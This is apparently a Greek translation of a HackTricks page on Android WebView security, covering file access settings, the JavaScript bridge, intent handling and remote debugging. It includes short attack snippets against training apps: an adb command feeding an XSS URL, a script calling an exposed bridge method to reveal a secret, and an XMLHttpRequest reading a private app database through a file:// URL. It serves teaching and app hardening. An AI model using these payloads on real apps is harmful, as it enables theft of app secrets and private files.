# Επιθέσεις στο WebView

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Απλοποιημένος Οδηγός για τις Διαμορφώσεις και την Ασφάλεια του WebView

### Επισκόπηση των Ευπαθειών του WebView

Ένα κρίσιμο κομμάτι της ανάπτυξης Android αφορά τη σωστή χειρισμό των WebViews. Αυτός ο οδηγός αναδεικνύει τις βασικές διαμορφώσεις και πρακτικές ασφαλείας για τη μείωση των κινδύνων που συνδέονται με τη χρήση του WebView.

![Παράδειγμα WebView](../../.gitbook/assets/image%20(718).png)

### **Πρόσβαση σε Αρχεία στα WebViews**

Από προεπιλογή, τα WebViews επιτρέπουν την πρόσβαση σε αρχεία. Αυτή η λειτουργία ελέγχεται από τη μέθοδο `setAllowFileAccess()`, διαθέσιμη από το επίπεδο API του Android 3 (Cupcake 1.5). Οι εφαρμογές με την άδεια **android.permission.READ_EXTERNAL_STORAGE** μπορούν να διαβάσουν αρχεία από εξωτερική αποθήκευση χρησιμοποιώντας ένα σχήμα URL αρχείου (`file://path/to/file`).

#### **Αποσυντεθειμένες Λειτουργίες: Universal και Πρόσβαση σε Αρχεία από URLs**

- **Universal Access From File URLs**: Αυτή η αποσυντεθειμένη λειτουργία επέτρεπε αιτήσεις cross-origin από URLs αρχείων, δημιουργώντας ένα σημαντικό κίνδυνο ασφάλειας λόγω πιθανών επιθέσεων XSS. Η προεπιλεγμένη ρύθμιση είναι απενεργοποιημένη (`false`) για εφαρμογές που στοχεύουν σε Android Jelly Bean και νεότερες εκδόσεις.
- Για να ελέγξετε αυτήν τη ρύθμιση, χρησιμοποιήστε τη μέθοδο `getAllowUniversalAccessFromFileURLs()`.
- Για να τροποποιήσετε αυτήν τη ρύθμιση, χρησιμοποιήστε τη μέθοδο `setAllowUniversalAccessFromFileURLs(boolean)`.

- **Πρόσβαση σε Αρχεία από File URLs**: Αυτή η λειτουργία, επίσης αποσυντεθειμένη, ελέγχει την πρόσβαση σε περιεχόμενο από άλλα URLs σχήματος αρχείου. Όπως και η παγκόσμια πρόσβαση, η προεπιλεγμένη ρύθμιση είναι απενεργοποιημένη για ενισχυμένη ασφάλεια.
- Χρησιμοποιήστε τη μέθοδο `getAllowFileAccessFromFileURLs()` για να ελέγξετε και τη μέθοδο `setAllowFileAccessFromFileURLs(boolean)` για να ορίσετε.

#### **Ασφαλής Φόρτωση Αρχείων**

Για την απενεργοποίηση της πρόσβασης στο σύστημα αρχείων ενώ εξακολουθεί να γίνεται πρόσβαση σε πόρους και περιεχόμενο, χρησιμοποιείται η μέθοδος `setAllowFileAccess()`. Από το Android R και νεότερες εκδόσεις, η προεπιλεγμένη ρύθμιση είναι `false`.
- Ελέγξτε με τη μέθοδο `getAllowFileAccess()`.
- Ενεργοποιήστε ή απενεργοποιήστε με τη μέθοδο `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

Η κλάση **WebViewAssetLoader** είναι η σύγχρονη προσέγγιση για τη φόρτωση τοπικών αρχείων. Χρησιμοποιεί http(s) URLs για την πρόσβαση σε τοπικούς πόρους και περιεχόμενο, ευθυγραμμίζοντας με την πολιτική ίδιας προέλευσης (Same-Origin policy), διευκολύνοντας έτσι τη διαχείριση του CORS.

### **Χειρισμός JavaScript και Σχήματος Intent**

- **JavaScript**: Απενεργοποιημένο από προεπιλογή στα WebViews, μπορεί να ενεργοποιηθεί μέσω της μεθόδου `setJavaScriptEnabled()`. Συνιστάται προσοχή καθώς η ενεργοποίηση του JavaScript χωρίς κατάλληλα μέτρα προστασίας μπορεί να εισάγει ευπάθειες ασφαλείας.

- **Χειρισμός Σχήματος Intent**: Τα WebViews μπορούν να χειριστούν το σχήμα `intent`, με τον κίνδυνο πιθανών εκμεταλλεύσεων εάν δεν διαχειριστούν προσεκτικά. Ένα παράδειγμα ευπάθειας περιλάμβανε ένα εκτεθέν WebView παράμετρο "support_url" που θα μπορούσε να εκμεταλλευτεί για την εκτέλεση επιθέσεων cross-site scripting (XSS).

![Ευπαθές WebView](../../.gitbook/assets/image%20(719).png)

Παράδειγμα εκμετάλλευσης χρησιμοποιώντας το adb:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
### Γέφυρα Javascript

Το Android παρέχει μια δυνατότητα που επιτρέπει στο **JavaScript** σε ένα WebView να καλεί **συναρτήσεις της εφαρμογής Android**. Αυτό επιτυγχάνεται χρησιμοποιώντας τη μέθοδο `addJavascriptInterface`, η οποία ενσωματώνει το JavaScript με τις λειτουργίες της εφαρμογής Android, γνωστή ως _γέφυρα JavaScript του WebView_. Συνιστάται προσοχή, καθώς αυτή η μέθοδος επιτρέπει σε όλες τις σελίδες εντός του WebView να έχουν πρόσβαση στο εγγεγραμμένο αντικείμενο διεπαφής JavaScript, δημιουργώντας έναν κίνδυνο ασφαλείας εάν ευαίσθητες πληροφορίες αποκαλυφθούν μέσω αυτών των διεπαφών.

### Σημαντικές Επισημάνσεις

- **Απαιτείται ακραία προσοχή** για εφαρμογές που στοχεύουν σε εκδόσεις Android κάτω από 4.2 λόγω μιας ευπάθειας που επιτρέπει την απομακρυσμένη εκτέλεση κώδικα μέσω κακόβουλου JavaScript, εκμεταλλευόμενο την αντανάκλαση.

#### Υλοποίηση μιας γέφυρας JavaScript

- Οι **διεπαφές JavaScript** μπορούν να αλληλεπιδρούν με τον καταγεγραμμένο κώδικα, όπως φαίνεται στα παραδείγματα όπου μια μέθοδος της κλάσης εκτίθεται στο JavaScript:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- Η γέφυρα JavaScript ενεργοποιείται προσθέτοντας μια διεπαφή στο WebView:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```
- Δυνητική εκμετάλλευση μέσω JavaScript, για παράδειγμα, μέσω επίθεσης XSS, επιτρέπει την κλήση αποκαλυμμένων μεθόδων Java:
```html
<script>alert(javascriptBridge.getSecret());</script>
```
- Για να μειώσετε τους κινδύνους, **περιορίστε τη χρήση της γέφυρας JavaScript** στον κώδικα που αποστέλλεται με το APK και αποτρέψτε τη φόρτωση JavaScript από απομακρυσμένες πηγές. Για παλαιότερες συσκευές, ορίστε το ελάχιστο επίπεδο API σε 17.

### Αντανάκλαση βασισμένη σε απομακρυσμένη εκτέλεση κώδικα (RCE)

- Μια τεκμηριωμένη μέθοδος επιτρέπει την επίτευξη RCE μέσω αντανάκλασης με την εκτέλεση ενός συγκεκριμένου φορτίου. Ωστόσο, η αναφορά `@JavascriptInterface` αποτρέπει την μη εξουσιοδοτημένη πρόσβαση σε μεθόδους, περιορίζοντας την επιθετική επιφάνεια.

### Απομακρυσμένος εντοπισμός σφαλμάτων

- Ο **απομακρυσμένος εντοπισμός σφαλμάτων** είναι δυνατός με τα **Chrome Developer Tools**, επιτρέποντας την αλληλεπίδραση και την αυθαίρετη εκτέλεση JavaScript μέσα στο περιεχόμενο του WebView.

#### Ενεργοποίηση απομακρυσμένου εντοπισμού σφαλμάτων

- Ο απομακρυσμένος εντοπισμός σφαλμάτων μπορεί να ενεργοποιηθεί για όλα τα WebViews μέσα σε μια εφαρμογή με τον εξής τρόπο:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- Για να ενεργοποιήσετε συνθήκες εντοπισμού σφαλμάτων με βάση την κατάσταση debuggable της εφαρμογής:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Εξαγωγή αυθαίρετων αρχείων

- Δείχνει την εξαγωγή αυθαίρετων αρχείων χρησιμοποιώντας ένα XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText);
}
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
## Αναφορές
* [https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
* [https://github.com/authenticationfailure/WheresMyBrowser.Android](https://github.com/authenticationfailure/WheresMyBrowser.Android)
* [https://developer.android.com/reference/android/webkit/WebView](https://developer.android.com/reference/android/webkit/WebView)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
